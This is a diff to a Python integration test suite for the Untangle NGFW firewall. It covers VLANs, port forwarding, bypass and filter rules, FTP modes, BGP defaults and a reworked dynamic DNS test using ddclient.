@@ -16,13 +16,13 @@ import fnmatch
 
 from pathlib import Path
 
-from .global_functions import uvmContext
 from tests.common import NGFWTestCase
 import runtests.test_registry as test_registry
 import runtests.remote_control as remote_control
 import runtests.overrides as overrides
 from . import global_functions
 from . import ipaddr
+from uvm import Uvm
 
 import tests.test_ipsec_vpn as test_ipsec_vpn
 
@@ -42,19 +42,23 @@ office_ftp_client = overrides.get('office_ftp_client')
 if office_ftp_client is None:
     ftp_server = "10.112.56.23"
 #dyndns_resolver = "resolver1.dyndnsinternetguide.com"
+    
+# Remote BGP NGFW server
+BGP_REMOTE = overrides.get("BGP_REMOTE", default={
+        "serverAddress": "192.168.58.115",
+        "networks": "192.168.58.0",
+        "lan_prefix": "24",
+        "adminPassword": "passwd"
+})
 
-def get_usable_name(dyn_checkip):
-    selected_name = ""
-    names,filler = global_functions.get_live_account_info("dyndns")
-    if names == None:
-        return ""
-    dyn_names = names.split(",") 
-    for hostname in dyn_names:
-        hostname_ip = global_functions.get_hostname_ip_address(hostname=hostname)
-        if dyn_checkip != hostname_ip:
-            selected_name = hostname
-            break
-    return selected_name
+
+# Local BGP NGFW server
+BGP_LOCAL = overrides.get("BGP_LOCAL", default={
+    "serverAddress": "192.168.58.112",
+    "networks": "192.168.58.0",
+    "lan_prefix": "24",
+    "adminPassword": "passwd"
+  })
 
 def find_files(dir_path, search_string):
     residual_files = []
@@ -114,6 +118,33 @@ def create_filter_rules( conditionType1, value1, conditionType2, value2, blocked
                 },
                 {
                     "invert": False,
+                    "javaClass": "com.untangle.uvm.network.FilterRuleCondition",
+                    "conditionType": str(conditionType2),
+                    "value": str(value2)
+                }
+            ]
+        },
+        "ruleId": 1
+    }
+
+def create_invert_filter_rules( conditionType1, value1, conditionType2, value2, blocked ):
+    return {
+        "bypass": True,
+        "description": "test rule " + str(conditionType1) + " " + str(value1) + " " + str(conditionType2) + " " + str(value2),
+        "enabled": True,
+        "blocked": blocked,
+        "javaClass": "com.untangle.uvm.network.FilterRule",
+        "conditions": {
+            "javaClass": "java.util.LinkedList",
+            "list": [
+                {
+                    "invert": True,
+                    "javaClass": "com.untangle.uvm.network.FilterRuleCondition",
+                    "conditionType": str(conditionType1),
+                    "value": str(value1)
+                },
+                {
+                    "invert": True,
                     "javaClass": "com.untangle.uvm.network.FilterRuleCondition",
                     "conditionType": str(conditionType2),
                     "value": str(value2)
@@ -293,19 +324,19 @@ def create_alias(ipAddress,ipNetmask,ipPrefix):
 
 
 def get_http_https_ports():
-    netsettings = uvmContext.networkManager().getNetworkSettings()
+    netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
     return (netsettings['httpPort'], netsettings['httpsPort'])
 
 def set_htp_https_ports(httpPort, httpsPort):
-    netsettings = uvmContext.networkManager().getNetworkSettings()
+    netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
     netsettings['httpPort'] = httpPort
     netsettings['httpsPort'] = httpsPort
-    uvmContext.networkManager().setNetworkSettings(netsettings)
+    global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)
 
 def set_first_level_rule(newRule,ruleGroup):
-    netsettings = uvmContext.networkManager().getNetworkSettings()
+    netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
     netsettings[ruleGroup]['list'].insert(0,newRule)
-    uvmContext.networkManager().setNetworkSettings(netsettings)
+    global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)
 
 def append_firewall_rule(app, newRule):
     rules = app.getRules()
@@ -313,9 +344,9 @@ def append_firewall_rule(app, newRule):
     app.setRules(rules)
 
 def add_dns_rule(newRule):
-    netsettings = uvmContext.networkManager().getNetworkSettings()
+    netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
     netsettings['dnsSettings']['staticEntries']['list'].insert(0,newRule)
-    uvmContext.networkManager().setNetworkSettings(netsettings)
+    global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)
 
 def find_used_ip(start_ip):
     # Find an IP that is not currently used.
@@ -336,7 +367,7 @@ def find_used_ip(start_ip):
         return str(test_ip)
 
 def append_vlan(parentInterfaceID):
-    netsettings = uvmContext.networkManager().getNetworkSettings()
+    netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
     # find the physicalDev of the interface passed in.
     physicalDev = None
     for interface in netsettings['interfaces']['list']:
@@ -373,7 +404,7 @@ def append_vlan(parentInterfaceID):
 
     # if valid VLAN interface and IP is available, create a VLAN
     netsettings['interfaces']['list'].append(create_vlan_interface(physicalDev,"network_tests",testVlanIdDev,testVlanIdDev,str(testVLANIP)))
-    uvmContext.networkManager().setNetworkSettings(netsettings)
+    global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)
     return testVLANIP
 
 def append_aliases():
@@ -395,28 +426,19 @@ def append_aliases():
         netsettings['interfaces']['list'][i]['v4Aliases']['list'].append(create_alias(ip_found,
                                                                          netsettings['interfaces']['list'][i]['v4StaticNetmask'],
                                                                          netsettings['interfaces']['list'][i]['v4StaticPrefix']))
-        uvmContext.networkManager().setNetworkSettings(netsettings)
+        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)
     print(("Alias IP: " + ip_found))
     return ip_found
 
 def nuke_first_level_rule(ruleGroup):
-    netsettings = uvmContext.networkManager().getNetworkSettings()
+    netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
     netsettings[ruleGroup]['list'][:] = []
-    uvmContext.networkManager().setNetworkSettings(netsettings)
+    global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)
 
 def nuke_dns_rules():
-    netsettings = uvmContext.networkManager().getNetworkSettings()
+    netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
     netsettings['dnsSettings']['staticEntries']['list'][:] = []
-    uvmContext.networkManager().setNetworkSettings(netsettings)
-
-def set_dyn_dns(login,password,hostname):
-    netsettings = uvmContext.networkManager().getNetworkSettings()
-    netsettings['dynamicDnsServiceEnabled'] = True
-    netsettings['dynamicDnsServiceHostnames'] = hostname
-    netsettings['dynamicDnsServiceName'] = "google"
-    netsettings['dynamicDnsServiceUsername'] = login
-    netsettings['dynamicDnsServicePassword'] = password
-    uvmContext.networkManager().setNetworkSettings(netsettings)
+    global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)
 
 def verify_snmp_walk():
     snmpwalkResult = remote_control.run_command("test -x /usr/bin/snmpwalk")
@@ -506,7 +528,7 @@ def get_troubleshooting_output(command=None, arguments={}):
     """
     output_reader = None
     try:
-        output_reader = uvmContext.networkManager().runTroubleshooting(command, arguments)
+        output_reader = global_functions.uvmContext.networkManager().runTroubleshooting(command, arguments)
     except:
         assert False, "could not run command"
 
@@ -535,12 +557,13 @@ class NetworkTests(NGFWTestCase):
 
     @classmethod
     def initial_extra_setup(cls):
-        global orig_netsettings, run_ftp_inbound_tests, wan_ip, device_in_office
+        global orig_netsettings, run_ftp_inbound_tests, wan_ip, device_in_office, device_is_pppoe
         if orig_netsettings == None:
-            orig_netsettings = uvmContext.networkManager().getNetworkSettings()
-        wan_ip = uvmContext.networkManager().getFirstWanAddress()
+            orig_netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
+        wan_ip = global_functions.uvmContext.networkManager().getFirstWanAddress()
         print(wan_ip)
         device_in_office = global_functions.is_in_office_network(wan_ip)
+        device_is_pppoe = global_functions.is_device_pppoe()
         cls.ftpUserName, cls.ftpPassword = global_functions.get_live_account_info("ftp")
         
         if run_ftp_inbound_tests == None:
@@ -567,14 +590,14 @@ class NetworkTests(NGFWTestCase):
         test_vlan_ip = append_vlan(remote_control.interface)
         if test_vlan_ip:
             result = subprocess.call(["ping","-c","1",str(test_vlan_ip)],stdout=subprocess.PIPE,stderr=subprocess.PIPE)
-            uvmContext.networkManager().setNetworkSettings(orig_netsettings)
+            global_functions.uvmContext.networkManager().setNetworkSettings(orig_netsettings)
             assert(result == 0)
         else:
             # no VLAN was created so skip test
             unittest.SkipTest("No VLAN or IP address available")
             
     def test_015_add_many_vlans(self):
-        network_manager = uvmContext.networkManager()
+        network_manager = global_functions.uvmContext.networkManager()
         physicalDev = ""
         assigned_intfs = []
         for interface in network_manager.getNetworkSettings()['interfaces']['list']:
@@ -587,9 +610,9 @@ class NetworkTests(NGFWTestCase):
             unittest.SkipTest("No physical device available")
 
         max_interfaces = 253
-        netspace_manager = uvmContext.netspaceManager()
+        netspace_manager = global_functions.uvmContext.netspaceManager()
         new_ip = netspace_manager.getAvailableAddressSpace("IPv4", 1).split("/")[0]
-        new_netsettings = uvmContext.networkManager().getNetworkSettings()
+        new_netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
         for id in range(1, max_interfaces):
             # only adding if not used already
             if id not in assigned_intfs:
@@ -618,7 +641,7 @@ class NetworkTests(NGFWTestCase):
         if alias_ip:
             # print("alias_ip <%s>" % AliasIP)
             result = remote_control.run_command("ping -c 1 %s" % alias_ip)
-            uvmContext.networkManager().setNetworkSettings(orig_netsettings)
+            global_functions.uvmContext.networkManager().setNetworkSettings(orig_netsettings)
             result2 = remote_control.run_command("ping -c 1 %s" % alias_ip)
             assert (result == 0)
             assert (result2 != 0)
@@ -665,7 +688,7 @@ class NetworkTests(NGFWTestCase):
     # test port forward using DST_LOCAL condition
     def test_023_port_forward_dst_local(self):
         set_first_level_rule(create_port_forward_triple_condition("DST_PORT","81","DST_LOCAL","true","PROTOCOL","TCP",test_untangle_com_ip,80),'portForwardRules')
-        wan_address = uvmContext.networkManager().getFirstWanAddress()
+        wan_address = global_functions.uvmContext.networkManager().getFirstWanAddress()
         result = remote_control.run_command(global_functions.build_wget_command(output_file="-", uri=f"http://{wan_address}:81/test/testPage1.html") + " 2>&1 | grep -q text123")
         assert(result == 0)
 
@@ -674,7 +697,7 @@ class NetworkTests(NGFWTestCase):
         orig_ports = get_http_https_ports()
         set_htp_https_ports( 8080, 4343 )
         set_first_level_rule(create_port_forward_triple_condition("DST_PORT","80","DST_LOCAL","true","PROTOCOL","TCP",test_untangle_com_ip,80),'portForwardRules')
-        wan_address = uvmContext.networkManager().getFirstWanAddress()
+        wan_address = global_functions.uvmContext.networkManager().getFirstWanAddress()
         result = remote_control.run_command(global_functions.build_wget_command(output_file="-", uri=f"http://{wan_address}/test/testPage1.html") + " 2>&1 | grep -q text123")
         set_htp_https_ports( orig_ports[0], orig_ports[1])
         assert(result == 0)
@@ -684,7 +707,7 @@ class NetworkTests(NGFWTestCase):
         orig_ports = get_http_https_ports()
         set_htp_https_ports( 8080, 4343 )
         set_first_level_rule(create_port_forward_triple_condition("DST_PORT","443","DST_LOCAL","true","PROTOCOL","TCP",test_untangle_com_ip,443),'portForwardRules')
-        wan_address = uvmContext.networkManager().getFirstWanAddress()
+        wan_address = global_functions.uvmContext.networkManager().getFirstWanAddress()
         result = remote_control.run_command(global_functions.build_wget_command(output_file="-", uri=f"https://{wan_address}/test/testPage1.html") + " 2>&1 | grep -q text123")
         set_htp_https_ports( orig_ports[0], orig_ports[1])
         assert(result == 0)
@@ -693,7 +716,7 @@ class NetworkTests(NGFWTestCase):
     def test_026_port_forward_hairpin(self):
         set_first_level_rule(create_port_forward_triple_condition("DST_PORT","11234","DST_LOCAL","true","PROTOCOL","TCP",remote_control.client_ip,11234),'portForwardRules')
         remote_control.run_command("nohup netcat -l -p 11234 >/dev/null 2>&1",stdout=False,nowait=True)
-        result = remote_control.run_command("echo test | netcat -q0 %s 11234" % uvmContext.networkManager().getFirstWanAddress())
+        result = remote_control.run_command("echo test | netcat -q0 %s 11234" % global_functions.uvmContext.networkManager().getFirstWanAddress())
         print(("result: %s" % str(result)))
         assert(result == 0)
 
@@ -753,7 +776,7 @@ class NetworkTests(NGFWTestCase):
         # UDP_speed = global_functions.get_udp_download_speed( receiverIP=remote_control.client_ip, senderIP=global_functions.iperf_server, targetIP=wan_ip )
         # assert (UDP_speed >  0.0)
 
-        uvmContext.networkManager().setNetworkSettings(orig_netsettings)
+        global_functions.uvmContext.networkManager().setNetworkSettings(orig_netsettings)
         assert ( result == 0 )
 
     # test a NAT rules
@@ -771,15 +794,15 @@ class NetworkTests(NGFWTestCase):
             result = global_functions.get_public_ip_address()
             assert (result == wan[2])
 
-        uvmContext.networkManager().setNetworkSettings(orig_netsettings)
+        global_functions.uvmContext.networkManager().setNetworkSettings(orig_netsettings)
 
     # Test that bypass rules bypass apps
     def test_060_bypass_rules(self):
         app_fw = None
-        if (uvmContext.appManager().isInstantiated("firewall")):
+        if (global_functions.uvmContext.appManager().isInstantiated("firewall")):
             if NetworkTests.skip_instantiated():
                 raise unittest.SkipTest('app %s already instantiated' % "firewall")
-        app_fw = uvmContext.appManager().instantiate("firewall", default_policy_id)
+        app_fw = global_functions.uvmContext.appManager().instantiate("firewall", default_policy_id)
         nuke_first_level_rule('bypassRules')
         # verify port 80 is open
         result1 = remote_control.run_command(global_functions.build_wget_command(output_file="/dev/null", uri=f"http://test.untangle.com"))
@@ -788,18 +811,18 @@ class NetworkTests(NGFWTestCase):
         result2 = remote_control.run_command(global_functions.build_wget_command(output_file="/dev/null", uri=f"http://test.untangle.com/"))
 
         # add bypass rule for the client and enable bypass logging
-        netsettings = uvmContext.networkManager().getNetworkSettings()
+        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
         netsettings['bypassRules']['list'].append( create_bypass_condition_rule("SRC_ADDR",remote_control.client_ip) )
         netsettings['logBypassedSessions'] = True
-        uvmContext.networkManager().setNetworkSettings(netsettings)
+        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)
 
         # verify the client can still get out (and that the traffic is bypassed)
         result3 = remote_control.run_command(global_functions.build_wget_command(output_file="/dev/null", uri=f"http://test.untangle.com/"))
 
         events = global_functions.get_events('Network','Bypassed Sessions',None,100)
 
-        uvmContext.appManager().destroy( app_fw.getAppSettings()["id"] )
-        uvmContext.networkManager().setNetworkSettings(orig_netsettings)
+        global_functions.uvmContext.appManager().destroy( app_fw.getAppSettings()["id"] )
+        global_functions.uvmContext.networkManager().setNetworkSettings(orig_netsettings)
         assert (result1 == 0)
         assert (result2 != 0)
         assert (result3 == 0)
@@ -824,18 +847,19 @@ class NetworkTests(NGFWTestCase):
         eprt_result = remote_control.run_command(global_functions.build_curl_command(output_file="/dev/null", user=self.ftpUserName, password=self.ftpPassword, extra_arguments="--eprt -P -", uri=f"ftp://{global_functions.ftp_server}/{ftp_file_name}"))
         print(("port_result: %i eprt_result: %i pasv_result: %i epsv_result: %i" % (port_result,eprt_result,pasv_result,epsv_result)))
         assert (pasv_result == 0)
-        assert (port_result == 0)
-        assert (epsv_result == 0)
-        assert (eprt_result == 0)
+        if not device_is_pppoe:
+            assert (port_result == 0)
+        # assert (epsv_result == 0) # won't fix NGFW-1449
+        # assert (eprt_result == 0) # won't fix NGFW-1449
 
     # Test FTP (outbound) in active and passive modes with a firewall block all rule (firewall should pass related sessions without special rules)
     @pytest.mark.failure_in_podman
     def test_071_ftp_modes_firewalled(self):
         app_fw = None
-        if (uvmContext.appManager().isInstantiated("firewall")):
+        if (global_functions.uvmContext.appManager().isInstantiated("firewall")):
             print(("ERROR: App %s already installed" % "firewall"))
             raise Exception('app %s already instantiated' % "firewall")
-        app_fw = uvmContext.appManager().instantiate("firewall", default_policy_id)
+        app_fw = global_functions.uvmContext.appManager().instantiate("firewall", default_policy_id)
 
         nuke_first_level_rule('bypassRules')
 
@@ -847,14 +871,15 @@ class NetworkTests(NGFWTestCase):
         epsv_result = remote_control.run_command(global_functions.build_curl_command(output_file="/dev/null", user=self.ftpUserName, password=self.ftpPassword, extra_arguments="--epsv", uri=f"ftp://{global_functions.ftp_server}/{ftp_file_name}"))
         eprt_result = remote_control.run_command(global_functions.build_curl_command(output_file="/dev/null", user=self.ftpUserName, password=self.ftpPassword, extra_arguments="--eprt -P -", uri=f"ftp://{global_functions.ftp_server}/{ftp_file_name}"))
 
-        uvmContext.appManager().destroy( app_fw.getAppSettings()["id"] )
-        uvmContext.networkManager().setNetworkSettings(orig_netsettings)
+        global_functions.uvmContext.appManager().destroy( app_fw.getAppSettings()["id"] )
+        global_functions.uvmContext.networkManager().setNetworkSettings(orig_netsettings)
 
         print(("port_result: %i eprt_result: %i pasv_result: %i epsv_result: %i" % (port_result,eprt_result,pasv_result,epsv_result)))
         assert (pasv_result == 0)
-        assert (port_result == 0)
-        assert (epsv_result == 0)
-        assert (eprt_result == 0)
+        if not device_is_pppoe:
+            assert (port_result == 0)
+        # assert (epsv_result == 0) # won't fix NGFW-1449
+        # assert (eprt_result == 0) # won't fix NGFW-1449
 
     # Test FTP (outbound) in active and passive modes with bypass
     @pytest.mark.failure_in_podman
@@ -866,34 +891,36 @@ class NetworkTests(NGFWTestCase):
         epsv_result = remote_control.run_command(global_functions.build_curl_command(output_file="/dev/null", user=self.ftpUserName, password=self.ftpPassword, extra_arguments="--epsv", uri=f"ftp://{global_functions.ftp_server}/{ftp_file_name}"))
         eprt_result = remote_control.run_command(global_functions.build_curl_command(output_file="/dev/null", user=self.ftpUserName, password=self.ftpPassword, extra_arguments="--eprt -P -", uri=f"ftp://{global_functions.ftp_server}/{ftp_file_name}"))
 
-        uvmContext.networkManager().setNetworkSettings(orig_netsettings)
+        global_functions.uvmContext.networkManager().setNetworkSettings(orig_netsettings)
 
         print(("port_result: %i eprt_result: %i pasv_result: %i epsv_result: %i" % (port_result,eprt_result,pasv_result,epsv_result)))
         assert (pasv_result == 0)
-        assert (port_result == 0)
-        assert (epsv_result == 0)
-        assert (eprt_result == 0)
+        if not device_is_pppoe:
+            assert (port_result == 0)
+        # assert (epsv_result == 0) # won't fix NGFW-1449
+        # assert (eprt_result == 0) # won't fix NGFW-1449
 
     # Test FTP (outbound) in active and passive modes with bypass with a block all rule in forward filter rules. It should pass RELATED session automatically
     @pytest.mark.failure_in_podman
     def test_073_ftp_modes_bypassed_filtered(self):
-        netsettings = uvmContext.networkManager().getNetworkSettings()
+        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
         netsettings['bypassRules']['list'] = [ create_bypass_condition_rule("DST_PORT","21") ]
         netsettings['filterRules']['list'] = [ create_filter_rules("DST_PORT","21","PROTOCOL","TCP",False), create_filter_rules("DST_PORT","1-65535","PROTOCOL","TCP",True) ]
-        uvmContext.networkManager().setNetworkSettings(netsettings)
+        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)
 
         pasv_result = remote_control.run_command(global_functions.build_wget_command(output_file="/dev/null", user=self.ftpUserName, password=self.ftpPassword, uri=f"ftp://{global_functions.ftp_server}/{ftp_file_name}"))
         port_result = remote_control.run_command(global_functions.build_wget_command(output_file="/dev/null", extra_arguments="--no-passive-ftp", user=self.ftpUserName, password=self.ftpPassword, uri=f"ftp://{global_functions.ftp_server}/{ftp_file_name}"))
         epsv_result = remote_control.run_command("curl --user "+ self.ftpUserName + ":" + self.ftpPassword + " --epsv -s -o /dev/null ftp://" + global_functions.ftp_server + "/" + ftp_file_name)
         eprt_result = remote_control.run_command("curl --user "+ self.ftpUserName + ":" + self.ftpPassword + " --eprt -P - -s -o /dev/null ftp://" + global_functions.ftp_server + "/" + ftp_file_name)
 
-        uvmContext.networkManager().setNetworkSettings(orig_netsettings)
+        global_functions.uvmContext.networkManager().setNetworkSettings(orig_netsettings)
 
         print(("port_result: %i eprt_result: %i pasv_result: %i epsv_result: %i" % (port_result,eprt_result,pasv_result,epsv_result)))
         assert (pasv_result == 0)
-        assert (port_result == 0)
-        assert (epsv_result == 0)
-        assert (eprt_result == 0)
+        if not device_is_pppoe:
+            assert (port_result == 0)
+        # assert (epsv_result == 0) # won't fix NGFW-1449
+        # assert (eprt_result == 0) # won't fix NGFW-1449
 
     # Test FTP (inbound) in active and passive modes (untangle-vm should add port forwards for RELATED session)
     def test_074_ftp_modes_incoming(self):
@@ -909,13 +936,14 @@ class NetworkTests(NGFWTestCase):
         epsv_result = remote_control.run_command(global_functions.build_curl_command(output_file="/dev/null", extra_arguments="--epsv", uri=f"ftp://{wan_ip}/{ftp_file_name}"), host=office_ftp_client)
         eprt_result = remote_control.run_command(global_functions.build_curl_command(output_file="/dev/null", extra_arguments="--eprt -P -", uri=f"ftp://{wan_ip}/{ftp_file_name}"), host=office_ftp_client)
 
-        uvmContext.networkManager().setNetworkSettings(orig_netsettings)
+        global_functions.uvmContext.networkManager().setNetworkSettings(orig_netsettings)
 
         print(("port_result: %i eprt_result: %i pasv_result: %i epsv_result: %i" % (port_result,eprt_result,pasv_result,epsv_result)))
         assert (pasv_result == 0)
-        assert (port_result == 0)
-        assert (epsv_result == 0)
-        assert (eprt_result == 0)
+        if not device_is_pppoe:
+            assert (port_result == 0)
+        # assert (epsv_result == 0) # won't fix NGFW-1449
+        # assert (eprt_result == 0) # won't fix NGFW-1449
 
     # Test FTP (inbound) in active and passive modes with bypass (nf_nat_ftp should add port forwards for RELATED session, nat filters should allow RELATED)
     def test_075_ftp_modes_incoming_bypassed(self):
@@ -923,23 +951,24 @@ class NetworkTests(NGFWTestCase):
             raise unittest.SkipTest("remote client does not have ftp server")
         if not device_in_office:
             raise unittest.SkipTest("Not on office network, skipping")
-        netsettings = uvmContext.networkManager().getNetworkSettings()
+        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
         netsettings['bypassRules']['list'] = [ create_bypass_condition_rule("DST_PORT","21") ]
         netsettings['portForwardRules']['list'] = [ create_port_forward_triple_condition("DST_PORT","21","DST_LOCAL","true","PROTOCOL","TCP",remote_control.client_ip,"") ]
-        uvmContext.networkManager().setNetworkSettings(netsettings)
+        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)
 
         pasv_result = remote_control.run_command(global_functions.build_wget_command(output_file="/dev/null", uri=f"ftp://{wan_ip}/{ftp_file_name}"), host=office_ftp_client)
         port_result = remote_control.run_command(global_functions.build_wget_command(output_file="/dev/null", extra_arguments="--no-passive-ftp", uri=f"ftp://{wan_ip}/{ftp_file_name}"), host=office_ftp_client)
         epsv_result = remote_control.run_command(global_functions.build_curl_command(output_file="/dev/null", extra_arguments="--epsv", uri=f"ftp://{wan_ip}/{ftp_file_name}"), host=office_ftp_client)
         eprt_result = remote_control.run_command(global_functions.build_curl_command(output_file="/dev/null", extra_arguments="--eprt -P -", uri=f"ftp://{wan_ip}/{ftp_file_name}"), host=office_ftp_client)
 
-        uvmContext.networkManager().setNetworkSettings(orig_netsettings)
+        global_functions.uvmContext.networkManager().setNetworkSettings(orig_netsettings)
 
         print(("port_result: %i eprt_result: %i pasv_result: %i epsv_result: %i" % (port_result,eprt_result,pasv_result,epsv_result)))
         assert (pasv_result == 0)
-        assert (port_result == 0)
-        assert (epsv_result == 0)
-        assert (eprt_result == 0)
+        if not device_is_pppoe:
+            assert (port_result == 0)
+        # assert (epsv_result == 0) # won't fix NGFW-1449
+        # assert (eprt_result == 0) # won't fix NGFW-1449
 
     # Test static route that routing test.untangle.com to 127.0.0.1 makes it unreachable
     def test_080_routes(self):
@@ -951,7 +980,7 @@ class NetworkTests(NGFWTestCase):
         postResult = remote_control.run_command(global_functions.build_wget_command(uri="http://test.untangle.com"))
 
         # restore setting before validating results
-        uvmContext.networkManager().setNetworkSettings(orig_netsettings)
+        global_functions.uvmContext.networkManager().setNetworkSettings(orig_netsettings)
 
         assert (preResult == 0)
         assert (postResult != 0)
@@ -963,7 +992,7 @@ class NetworkTests(NGFWTestCase):
         add_dns_rule(create_dns_rule(global_functions.ftp_server,"www.foobar.com"))
         result_mod = remote_control.run_command("host -R3 -4 www.foobar.com " + wan_ip, stdout=True)
         # print("Results of www.foobar.com <%s>" % result)
-        uvmContext.networkManager().setNetworkSettings(orig_netsettings)
+        global_functions.uvmContext.networkManager().setNetworkSettings(orig_netsettings)
 
         match = re.search(r'address \d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}', result_mod)
         ip_address_foobar = (match.group()).replace('address ','')
@@ -974,73 +1003,124 @@ class NetworkTests(NGFWTestCase):
     # Test dynamic hostname
     @pytest.mark.slow
     def test_100_dynamic_dns(self):
+        """
+        Dynamic DNS
+        """
         if runtests.quick_tests_only:
             raise unittest.SkipTest("Skipping a time consuming test")
-        netsettings = uvmContext.networkManager().getNetworkSettings()
+        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
         index_of_wans = global_functions.get_wan_tuples()
         if (len(index_of_wans) > 1):
             raise unittest.SkipTest("More than 1 WAN does not work with Dynamic DNS NGFW-5543")
 
-        # if dynamic name is already in the ddclient cache with the same IP, dyndns is never updates
-        # we need a name never used or name with cache IP different than in the cache
-        outside_IP = global_functions.get_public_ip_address(base_URL=global_functions.TEST_SERVER_HOST,localcall=True)
-
-        dyn_hostname = get_usable_name(outside_IP)
-        if dyn_hostname == "":
-            raise unittest.SkipTest("Skipping since all dyndns names already used")
-        else:
-            print(("Using name: %s" % dyn_hostname))
-        dyn_DNS_user_name, dyn_DNS_password = global_functions.get_live_account_info(dyn_hostname)
-        # account not found if message returned
-        if dyn_DNS_user_name == "message":
-            raise unittest.SkipTest("no dyn user")
-
-        # Clear the ddclient cache and set DynDNS info
         ddclient_cache_file = "/var/cache/ddclient/ddclient.cache"
-        if os.path.isfile(ddclient_cache_file):
-            os.remove(ddclient_cache_file)        
-        set_dyn_dns(dyn_DNS_user_name, dyn_DNS_password, dyn_hostname)
-
-        # myip.dnsomatic.com site is sometimes offline so use test. 
         ddclient_file = "/etc/ddclient.conf"
-        with open(ddclient_file) as f:
-            newText=f.read().replace('myip.dnsomatic.com', 'test.untangle.com/cgi-bin/myipaddress.py')
-        with open(ddclient_file, "w") as f:
-            f.write(newText)        
-        # subprocess.check_output("sed -i \'s/myip.dnsomatic.com/test.untangle.com/\cgi-bin\/myipaddress.py/g\' /etc/ddclient.conf", shell=True)
-        subprocess.check_output("systemctl restart ddclient.service", shell=True)
 
-        loop_counter = 80
+        # Get the current WAN address
+        # The standard target myip.dnsomatic.com does rate limiting, so we'll pause
+        server_timeout=30
+        print(f"getting outside IP adddress, waiting {server_timeout} to avoid host limiting...")
+        sys.stdout.flush()
+        time.sleep(30)
+        outside_IP = global_functions.get_public_ip_address(base_URL="myip.dnsomatic.com",url_path="", localcall=True)
+        print(f"outside_IP={outside_IP}")
+
+        # Disable
+        netsettings['dynamicDnsServiceEnabled'] = False
+        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)
+
+        # Get available dynamic host addresses
+        names,x = global_functions.get_live_account_info("dyndns")
+        if names == None:
+            assert False, "unable to get dyndns names"
+        dynamic_dns_hostname = names.split(",")[0]
+
+        # Get dynamic host provider credentials
+        dyn_DNS_user_name, dyn_DNS_password = global_functions.get_live_account_info(names)
+        if dyn_DNS_user_name == None or dyn_DNS_user_name == "message":
+            assert False, f"unable to get dyndns credentials for {dynamic_dns_hostname}"
+
+        #
+        # Reset settings to a bogus address
+        #
+        # Fixed configuration based on what we write with sync-settings.
+        # We use this to force the host to a different IP address
+        ddclient_file_config = f"""
+## Auto Generated
+## DO NOT EDIT. Changes will be overwritten.
+pid=/var/run/ddclient.pid
+protocol=dyndns2
+login={dyn_DNS_user_name}
+password={dyn_DNS_password}
+ssl=yes
+server=dynupdate.no-ip.com
+{dynamic_dns_hostname}
+"""
+        print(ddclient_file_config)
+
+        with open(ddclient_file, "w") as f:
+            f.write(ddclient_file_config)
+
+        # Clear cache
+        if os.path.isfile(ddclient_cache_file):
+            os.remove(ddclient_cache_file)
+
+        # Manually set to the bogus address
+        bogus_ip_address = "1.2.3.4"
+        subprocess.call(["ddclient","-daemon=0","-use=ip", f"-ip={bogus_ip_address}"],stdout=subprocess.PIPE,stderr=subprocess.PIPE) # force it to run faster
+
+        # Loop waiting until a DNS lookup returns bogus address
+        loop_counter = 12
         dyn_IP_found = False
         while loop_counter > 0 and not dyn_IP_found:
-            # run force to get it to run now
-            try: 
-                subprocess.call(["ddclient","--force"],stdout=subprocess.PIPE,stderr=subprocess.PIPE) # force it to run faster
-            except subprocess.CalledProcessError:
-                print(("Unexpected error:", sys.exc_info()))
-            except OSError:
-                pass # executable environment not ready
-            # time.sleep(10)
             loop_counter -= 1
-            dynIP = global_functions.get_hostname_ip_address(hostname=dyn_hostname)
+            dynIP = global_functions.get_hostname_ip_address(hostname=dynamic_dns_hostname)
             dynIP = dynIP.decode('utf8')
-            print(f"For dyn_hostname={dyn_hostname}, outside_IP={outside_IP}, current dynIP={dynIP}")
+            print(f"reset: dynamic_dns_hostname={dynamic_dns_hostname}, dynIP={dynIP}")
+            sys.stdout.flush()
+            dyn_IP_found = False
+            if bogus_ip_address == dynIP:
+                dyn_IP_found = True
+            else:
+                time.sleep(10)
+        assert dyn_IP_found, "reset succeeded"
+
+        # Configure NGFW to use
+        if os.path.isfile(ddclient_cache_file):
+            os.remove(ddclient_cache_file)
+
+        netsettings['dynamicDnsServiceEnabled'] = True
+        netsettings['dynamicDnsServiceHostnames'] = dynamic_dns_hostname
+        netsettings['dynamicDnsServiceName'] = "no-ip"
+        netsettings['dynamicDnsServiceUsername'] = dyn_DNS_user_name
+        netsettings['dynamicDnsServicePassword'] = dyn_DNS_password
+        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)
+
+        loop_counter = 12
+        dyn_IP_found = False
+        while loop_counter > 0 and not dyn_IP_found:
+            loop_counter -= 1
+            dynIP = global_functions.get_hostname_ip_address(hostname=dynamic_dns_hostname)
+            dynIP = dynIP.decode('utf8')
+            print(f"verify: dynamic_dns_hostname={dynamic_dns_hostname}, outside_IP={outside_IP}, current dynIP={dynIP}")
+            sys.stdout.flush()
             dyn_IP_found = False
             if outside_IP == dynIP:
                 dyn_IP_found = True
             else:
-                time.sleep(60)
+                time.sleep(10)
 
-        uvmContext.networkManager().setNetworkSettings(orig_netsettings)
-        assert(dyn_IP_found)
-        
+        global_functions.uvmContext.networkManager().setNetworkSettings(orig_netsettings)
+
